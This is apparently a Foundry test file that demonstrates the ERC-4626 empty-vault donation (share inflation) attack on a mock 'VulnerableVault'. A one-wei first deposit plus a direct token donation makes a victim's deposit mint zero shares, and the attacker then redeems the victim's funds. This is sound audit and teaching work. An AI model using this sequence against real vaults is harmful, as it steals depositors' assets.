// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";

import {MockERC20} from "../src/MockERC20.sol";
import {VulnerableVault} from "../src/VulnerableVault.sol";

contract ERC4626InflationTest is Test {
    MockERC20 internal asset;
    VulnerableVault internal vault;

    address internal attacker = makeAddr("attacker");
    address internal victim = makeAddr("victim");

    uint256 internal constant ATTACKER_SEED = 1;
    uint256 internal constant DONATION = 100e18;
    uint256 internal constant VICTIM_DEPOSIT = 100e18;

    function setUp() public {
        asset = new MockERC20("Mock Asset", "MOCK", 18);
        vault = new VulnerableVault(asset);

        asset.mint(attacker, ATTACKER_SEED + DONATION);
        asset.mint(victim, VICTIM_DEPOSIT);

        vm.prank(attacker);
        asset.approve(address(vault), type(uint256).max);

        vm.prank(victim);
        asset.approve(address(vault), type(uint256).max);
    }

    function test_directDonationRaisesExchangeRateWithoutMintingShares() public {
        vm.prank(attacker);
        uint256 attackerShares = vault.deposit(ATTACKER_SEED, attacker);

        assertEq(attackerShares, 1, "attacker should receive one initial share");
        assertEq(vault.totalSupply(), 1, "vault should have one share before donation");
        assertEq(vault.convertToAssets(1), 1, "one share should initially redeem one asset");

        vm.prank(attacker);
        asset.transfer(address(vault), DONATION);

        assertEq(vault.totalSupply(), 1, "donation should not mint shares");
        assertEq(vault.balanceOf(attacker), 1, "attacker should still own the only share");
        assertEq(vault.totalAssets(), ATTACKER_SEED + DONATION, "vault assets should include donation");

        assertEq(
            vault.convertToAssets(1),
            ATTACKER_SEED + DONATION,
            "one share should now claim seed plus donation"
        );
    }

    function test_previewDepositReturnsZeroAfterDonation() public {
        vm.prank(attacker);
        vault.deposit(ATTACKER_SEED, attacker);

        vm.prank(attacker);
        asset.transfer(address(vault), DONATION);

        uint256 victimPreviewShares = vault.previewDeposit(VICTIM_DEPOSIT);

        assertEq(victimPreviewShares, 0, "victim deposit should preview zero shares");
    }

    function test_emptyVaultDonationAttack_victimMintsZeroShares() public {
        uint256 attackerInitialBalance = asset.balanceOf(attacker);
        uint256 victimInitialBalance = asset.balanceOf(victim);

        assertEq(attackerInitialBalance, ATTACKER_SEED + DONATION);
        assertEq(victimInitialBalance, VICTIM_DEPOSIT);

        // 1. Attacker becomes the first depositor with one wei of asset.
        vm.prank(attacker);
        uint256 attackerShares = vault.deposit(ATTACKER_SEED, attacker);

        assertEq(attackerShares, 1, "attacker should mint one share");
        assertEq(vault.balanceOf(attacker), 1, "attacker should own one share");
        assertEq(vault.totalSupply(), 1, "total share supply should be one");

        // 2. Attacker donates assets directly to the vault.
        // This increases totalAssets but does not mint shares.
        vm.prank(attacker);
        asset.transfer(address(vault), DONATION);

        assertEq(vault.totalAssets(), ATTACKER_SEED + DONATION, "vault should include seed plus donation");
        assertEq(vault.totalSupply(), 1, "donation should not change share supply");

        // 3. Victim deposits a positive amount, but receives zero shares due to floor rounding.
        uint256 victimPreviewShares = vault.previewDeposit(VICTIM_DEPOSIT);
        assertEq(victimPreviewShares, 0, "victim preview should be zero");

        vm.prank(victim);
        uint256 victimShares = vault.deposit(VICTIM_DEPOSIT, victim);

        assertEq(victimShares, 0, "victim should mint zero shares");
        assertEq(vault.balanceOf(victim), 0, "victim should own no shares");
        assertEq(asset.balanceOf(victim), 0, "victim asset balance should be spent");

        // 4. Attacker owns 100% of shares and redeems the full vault balance.
        uint256 vaultAssetsBeforeRedeem = asset.balanceOf(address(vault));
        assertEq(
            vaultAssetsBeforeRedeem,
            ATTACKER_SEED + DONATION + VICTIM_DEPOSIT,
            "vault should contain seed, donation, and victim deposit"
        );

        vm.prank(attacker);
        uint256 redeemedAssets = vault.redeem(attackerShares, attacker, attacker);

        assertEq(
            redeemedAssets,
            ATTACKER_SEED + DONATION + VICTIM_DEPOSIT,
            "attacker should redeem all vault assets"
        );

        assertEq(asset.balanceOf(address(vault)), 0, "vault should be empty after attacker redemption");
        assertEq(vault.totalSupply(), 0, "all shares should be burned");

        assertEq(
            asset.balanceOf(attacker),
            ATTACKER_SEED + DONATION + VICTIM_DEPOSIT,
            "attacker final balance should include victim deposit"
        );

        assertEq(asset.balanceOf(victim), 0, "victim should have lost deposited assets");
    }

    function test_zeroShareCondition_threshold() public {
        vm.prank(attacker);
        vault.deposit(ATTACKER_SEED, attacker);

        vm.prank(attacker);
        asset.transfer(address(vault), DONATION);

        uint256 currentTotalAssets = vault.totalAssets();

        assertEq(currentTotalAssets, ATTACKER_SEED + DONATION);
        assertEq(vault.totalSupply(), 1);

        // With totalSupply = 1:
        // shares = floor(assets / totalAssets)
        // Therefore assets < totalAssets mints zero shares.
        assertEq(vault.previewDeposit(currentTotalAssets - 1), 0, "below threshold should mint zero shares");
        assertEq(vault.previewDeposit(currentTotalAssets), 1, "at threshold should mint one share");
        assertEq(vault.previewDeposit(currentTotalAssets + 1), 1, "just above threshold should mint one share");
        assertEq(vault.previewDeposit(2 * currentTotalAssets), 2, "two times threshold should mint two shares");
    }
}